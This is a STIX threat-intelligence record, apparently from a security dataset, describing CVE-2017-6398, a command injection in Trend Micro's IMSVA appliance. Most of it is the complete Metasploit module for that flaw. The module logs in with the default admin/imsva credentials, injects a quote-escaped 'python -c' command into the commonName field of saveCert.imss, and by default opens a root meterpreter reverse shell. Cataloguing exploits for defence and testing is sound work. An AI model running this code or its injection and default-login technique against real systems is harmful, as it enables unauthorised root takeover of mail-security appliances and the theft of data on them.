{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c4e3e7ef-9063-468c-8764-474c2671d7a2",
    "created": "2024-08-14T17:01:27.334689Z",
    "modified": "2024-08-14T17:01:27.334694Z",
    "name": "Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution",
    "description": " This module exploits a command injection vulnerability in the Trend Micro IMSVA product. An authenticated user can execute a terminal command under the context of the web server user which is root. Besides, default installation of IMSVA comes with a default administrator credentials.  saveCert.imss endpoint takes several user inputs and performs blacklisting. After that it use them as argument of predefined operating system command without proper sanitation. However, due to improper blacklisting rule it's possible to inject arbitrary commands into it. InterScan Messaging Security prior to 9.1.-1600 affected by this issue.  This module was tested against IMSVA 9.1-1600.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/trend_micro_imsva_exec.rb",
            "external_id": "trend_micro_imsva_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6398"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/advisory-trend-micro-interscan-messaging-security-virtual-appliance-remote-code-execution/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability in the Trend Micro\n        IMSVA product. An authenticated user can execute a terminal command under\n        the context of the web server user which is root. Besides, default installation\n        of IMSVA comes with a default administrator credentials.\n\n        saveCert.imss endpoint takes several user inputs and performs blacklisting.\n        After that it use them as argument of predefined operating system command\n        without proper sanitation. However, due to improper blacklisting rule it's possible to inject\n        arbitrary commands into it. InterScan Messaging Security prior to 9.1.-1600 affected by this issue.\n\n        This module was tested against IMSVA 9.1-1600.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mehmet Ince <mehmet@mehmetince.net>' # discovery & msf module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-6398'],\n          ['URL', 'https://pentest.blog/advisory-trend-micro-interscan-messaging-security-virtual-appliance-remote-code-execution/']\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'BadChars'    => \"\\x2f\\x22\"\n        },\n      'DefaultOptions' =>\n        {\n          'SSL' => true,\n          'payload' => 'python/meterpreter/reverse_tcp',\n        },\n      'Platform'       => ['python'],\n      'Arch'           => ARCH_PYTHON,\n      'Targets'        => [ ['Automatic', {}] ],\n      'DisclosureDate' => '2017-01-15',\n      'DefaultTarget'  => 0\n       ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The target URI of the Trend Micro IMSVA', '/']),\n        OptString.new('USERNAME', [ true, 'The username for authentication', 'admin' ]),\n        OptString.new('PASSWORD', [ true, 'The password for authentication', 'imsva' ]),\n        Opt::RPORT(8445)\n      ]\n    )\n  end\n\n  def login\n\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    print_status(\"Attempting to login with #{user}:#{pass}\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'login.imss'),\n      'vars_post' => {\n        'userid' => user,\n        'pwdfake' => Rex::Text::encode_base64(pass)\n      }\n    })\n\n    if res && res.body.include?(\"The user name or password you entered is invalid\")\n      fail_with(Failure::NoAccess, \"#{peer} - Login with #{user}:#{pass} failed...\")\n    end\n\n    cookie = res.get_cookies\n    if res.code == 302 && cookie.include?(\"JSESSIONID\")\n      jsessionid = cookie.scan(/JSESSIONID=(\\w+);/).flatten.first\n      print_good(\"Authenticated as #{user}:#{pass}\")\n      return jsessionid\n    end\n\n    nil\n  end\n\n  def exploit\n\n    jsessionid = login\n\n    unless jsessionid\n      fail_with(Failure::Unknown, 'Unable to obtain the cookie session ID')\n    end\n\n    # Somehow java stores last visited url on session like viewstate!\n    # Visit form before submitting it. Otherwise, it will cause a crash.\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'initCert.imss'),\n      'cookie' => \"JSESSIONID=#{jsessionid}\"\n    })\n\n    if !res or !res.body.include?(\"Transport Layer Security\")\n      fail_with(Failure::Unknown, 'Unable to visit initCert.imss')\n    end\n\n    # Random string that will be used as a cert name, state, email etc.\n    r = Rex::Text::rand_text_alphanumeric(5)\n\n    print_status(\"Delivering payload...\")\n\n    # Since double quote are blacklisted, we are using Single, Backslash, Single, Single on our payload. Thanks to @wvu !!!\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, 'saveCert.imss'),\n      'cookie' => \"JSESSIONID=#{jsessionid}\",\n      'vars_get' => {\n          'mode' => 0\n      },\n      'vars_post' => {\n        'certName' => r,\n        'certType' => 0,\n        'keyLength' => 2048,\n        'countryCode' => 'TR',\n        'state' => r,\n        'locality' => r,\n        'org' => r,\n        'orgUnit' => r,\n        'commonName' => \"#{r}';python -c '#{payload.encoded.gsub(\"'\", \"'\\\\\\\\''\")}' #\",\n        'emailAddress' => \"#{r}@mail.com\",\n        'validDays' => '',\n        'id' => '',\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-01-15",
    "x_mitre_platforms": [
        "['python']"
    ]
}